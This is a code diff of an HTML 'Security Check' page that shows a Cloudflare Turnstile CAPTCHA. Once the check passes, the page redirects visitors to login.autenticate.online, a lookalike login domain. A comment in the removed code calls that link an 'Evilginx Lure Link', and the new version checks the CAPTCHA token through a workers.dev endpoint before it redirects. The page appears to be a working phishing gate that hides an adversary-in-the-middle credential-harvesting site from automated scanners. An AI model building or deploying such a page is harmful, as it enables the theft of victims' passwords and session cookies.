@@ -1,66 +1,255 @@
+
 <!DOCTYPE html>
-<html lang=“en”>
+<html lang="en">
 <head>
-    <meta charset=“UTF-8”>
-    <meta name=“viewport” content=“width=device-width, initial-scale=1.0”>
-    <title>Security Verification</title>
-    <!— Load Cloudflare Turnstile Script —>
-    <script src=“https://challenges.cloudflare.com/turnstile/v0/api.js” async defer></script>
-    
-    <style>
-        body {
-            font-family: ‘Segoe UI’, Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 300px;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-        /* Makes the checkbox larger and more prominent */
-        .cf-turnstile {
-transform: scale(1.5); /* Makes it bigger */
-margin: 20px auto; /* Centers it */
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification</title>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
 }
-    </style>
+
+body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #080D17;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 430px;
+    background: #111A29;
+    border: 1px solid #26364C;
+    border-radius: 18px;
+    padding: 35px 25px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,.4);
+}
+
+.logo {
+    width: 65px;
+    height: 65px;
+    margin: 0 auto 20px;
+    background: #172B45;
+    color: #50BFFF;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+}
+
+h1 {
+    font-size: 25px;
+    margin-bottom: 12px;
+}
+
+.description {
+    color: #9EADC1;
+    font-size: 14px;
+    line-height: 1.7;
+    margin-bottom: 25px;
+}
+
+.verification {
+    background: #0B1422;
+    border: 1px solid #293C55;
+    border-radius: 12px;
+    padding: 18px 12px;
+    margin-bottom: 20px;
+}
+
+.verification-title {
+    font-size: 14px;
+    margin-bottom: 15px;
+}
+
+#turnstile {
+    display: flex;
+    justify-content: center;
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 9px;
+    background: #167DD2;
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: .2s;
+}
+
+button:disabled {
+    opacity: .4;
+    cursor: not-allowed;
+}
+
+button:not(:disabled):hover {
+    background: #2495F0;
+}
+
+#status {
+    margin-top: 16px;
+    font-size: 13px;
+    color: #A9B9CE;
+    line-height: 1.5;
+}
+
+.footer {
+    margin-top: 25px;
+    font-size: 11px;
+    color: #718198;
+}
+
+.destination {
+    color: #64BEFF;
+    font-size: 12px;
+    margin-top: 10px;
+    overflow-wrap: anywhere;
+}
+</style>
 </head>
+
 <body>
 
-    <div class=“card”>
-        <h2>Verify Human</h2>
-        <p>Please complete the security check to continue.</p>
-        
-        <!— The Visible Checkbox —>
-        <!— REPLACE THE KEY BELOW WITH YOUR ACTUAL CLOUDFLARE KEY —>
-        <div class=“cf-turnstile” 
-             data-sitekey=“0x4AAAAAAGQ60F12MuReeH5w” 
-             data-callback=“onSuccess”>
+<div class="container">
+
+    <div class="logo">✓</div>
+
+    <h1>Security Check</h1>
+
+    <p class="description">
+        Before continuing, please complete the security
+        verification below to confirm that you are human.
+    </p>
+
+    <div class="verification">
+        <div class="verification-title">
+            Human Verification
         </div>
+        <div id="turnstile"></div>
     </div>
 
-    <script>
-        function onSuccess(token) {
-            // Replace this URL with your actual Evilginx Lure Link
-            window.location.href = “https://login.autenticate.online/UfvryfIU”;
+    <button id="continueBtn" disabled>
+        Continue to Website
+    </button>
+
+    <p id="status">Please complete the verification.</p>
+
+    <p class="destination">
+        Destination: https://login.autenticate.online/UfvryfIU
+    </p>
+
+    <div class="footer">
+        Protected by Cloudflare Turnstile
+    </div>
+
+</div>
+
+<script>
+const SITE_KEY = "0x4AAAAAAGQ60F12MuReeH5w";
+
+const WORKER_URL = "https://bussiness-verification.nataldario86.workers.dev/";
+
+const DESTINATION_URL = "https://login.autenticate.online/UfvryfIU";
+
+let captchaToken = null;
+let widgetId = null;
+
+const button = document.getElementById("continueBtn");
+const statusText = document.getElementById("status");
+
+function loadCaptcha() {
+    if (!window.turnstile) {
+        setTimeout(loadCaptcha, 300);
+        return;
+    }
+
+    widgetId = turnstile.render("#turnstile", {
+        sitekey: SITE_KEY,
+        action: "business_redirect",
+
+        callback: function(token) {
+            captchaToken = token;
+            button.disabled = false;
+            statusText.textContent =
+                "Verification successful. You can continue.";
+        },
+
+        "expired-callback": function() {
+            captchaToken = null;
+            button.disabled = true;
+            statusText.textContent =
+                "Verification expired. Please verify again.";
+        },
+
+        "error-callback": function() {
+            captchaToken = null;
+            button.disabled = true;
+            statusText.textContent =
+                "Verification error. Please try again.";
         }
-    </script>
+    });
+}
+
+button.addEventListener("click", async function() {
+
+    if (!captchaToken) return;
+
+    button.disabled = true;
+    button.textContent = "Verifying...";
+    statusText.textContent = "Checking your verification...";
+
+    try {
+        const response = await fetch(WORKER_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                token: captchaToken
+            })
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+            throw new Error("Verification failed");
+        }
+
+        statusText.textContent = "Verified! Redirecting...";
+
+        window.location.replace(DESTINATION_URL);
+
+    } catch (error) {
+
+        captchaToken = null;
+        button.textContent = "Continue to Website";
+        statusText.textContent =
+            "Verification could not be completed. Please try again.";
+
+        if (widgetId !== null) {
+            turnstile.reset(widgetId);
+        }
+    }
+});
+
+window.addEventListener("load", loadCaptcha);
+</script>
 
 </body>
 </html>
